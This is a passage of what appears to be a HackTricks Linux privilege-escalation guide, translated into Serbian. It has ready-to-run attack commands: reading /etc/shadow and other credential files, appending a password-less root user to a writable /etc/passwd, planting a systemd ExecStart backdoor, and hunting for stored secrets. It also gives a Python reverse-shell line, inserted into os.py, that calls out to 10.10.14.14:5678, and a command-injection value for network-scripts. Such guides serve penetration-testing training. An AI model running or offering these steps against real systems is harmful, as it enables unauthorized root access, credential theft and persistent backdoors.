U zavisnosti od OS-a fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati backup. Zato se preporučuje da **pronađete sve** i **proverite da li možete da ih pročitate** da biste videli **da li se u fajlovima nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u datoteci `/etc/passwd` (ili u ekvivalentnoj).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo, generišite lozinku koristeći jednu od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i postavite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\ UPOZORENJE: ovo može narušiti trenutni nivo bezbednosti mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, da li možete da pišete u neki **service configuration file**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **modify the Tomcat service configuration file inside /etc/systemd/,** onda možete изmenити sledeće linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor će biti izvršen sledeći put kada se tomcat pokrene.

### Proverite direktorijume

Sledeći direktorijumi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudna lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/binarne datoteke u PATH-u**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web datoteke**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih datoteka koje bi mogle sadržati lozinke**.\
**Drugi zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacija otvorenog koda koja služi za prikupljanje velikog broja lozinki pohranjenih na lokalnom računaru za Windows, Linux & Mac.

### Logs

Ako možete čitati logs, možda ćete moći pronaći **interesantne/poverljive informacije u njima**. Što je log čudniji, to će verovatno biti zanimljiviji.\
Takođe, neki **"loše"** konfigurisani (backdoored?) **audit logs** mogu vam dozvoliti da **zabeležite lozinke** unutar audit logova kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste mogli da **čitati logove**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe treba da proverite fajlove koji u svom **nazivu** sadrže reč "**password**" ili unutar samog **sadržaja**, kao i da proverite za IPs i emails u logovima, ili hashes regexps.\
Neću ovde nabrajati kako se sve ovo radi, ali ako vas zanima možete pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvodi.

## Fajlovi koji se mogu pisati

### Python library hijacking

Ako znate **odakle** će se izvršavati python skripta i **možete pisati u** taj folder ili **možete izmeniti python biblioteke**, možete izmeniti OS library i ubaciti backdoor (ako možete pisati tamo gde će se izvršavati python skripta, kopirajte i nalepite os.py biblioteku).

Da biste **backdoor the library**, samo dodajte na kraj os.py biblioteke sledeću liniju (promenite IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Ranljivost u `logrotate` omogućava korisnicima sa **pravima za pisanje** na log fajlu ili njegovim nadređenim direktorijumima da potencijalno dobiju povišene privilegije. To je zato što se `logrotate`, koji često radi kao **root**, može manipulisati da izvršava proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti dozvole ne samo u _/var/log_, već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranljivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete izmeniti logove, proverite ko upravlja tim logovima i proverite da li možete eskalirati privilegije zamenom logova simboličkim linkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenca ranjivosti:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **napiše** `ifcf-<whatever>` skript u _/etc/sysconfig/network-scripts_ **ili** može da **izmijeni** postojeći, onda je **vaš sistem pwned**.

Network scripts, _ifcg-eth0_ na primer, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, oni su ~sourced~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama nije pravilno obrađen. Ako imate **belo/prazno mesto u imenu, sistem pokušava da izvrši deo nakon belog/praznog mesta**. To znači da se **sve nakon prvog praznog mesta izvršava kao root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: prazan razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasičan Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. One se mogu izvršiti direktno ili putem simboličkih linkova u `/etc/rc?.d/`. Alternativna putanja na Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je povezan sa **Upstart**, novijim **sistemom za upravljanje servisima** koji je uveo Ubuntu, i koristi konfiguracione fajlove za upravljanje servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog sloja kompatibilnosti u Upstartu.

**systemd** se pojavljuje kao moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje daemon-a na zahtev, upravljanje automount-ima i snimci stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i `/etc/systemd/system/` za izmene administratora, olakšavajući administraciju sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks obično hook-uju syscall kako bi izložili privilegovanu kernel funkcionalnost userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loši šemovi lozinki) može omogućiti lokalnoj aplikaciji da se prikaže kao manager i eskalira na root na uređajima koji su već root-ovani. Saznajte više i detalje exploita ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može izvući putanju do binarnog fajla iz command line procesa i izvršiti je sa -v u privilegovanom kontekstu. Permisivni paterni (npr. korišćenjem \S) mogu se poklopiti sa napadačem postavljenim listener-ima u zapisivim lokacijama (npr. /tmp/httpd), što može dovesti do izvršavanja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani obrazac primenljiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
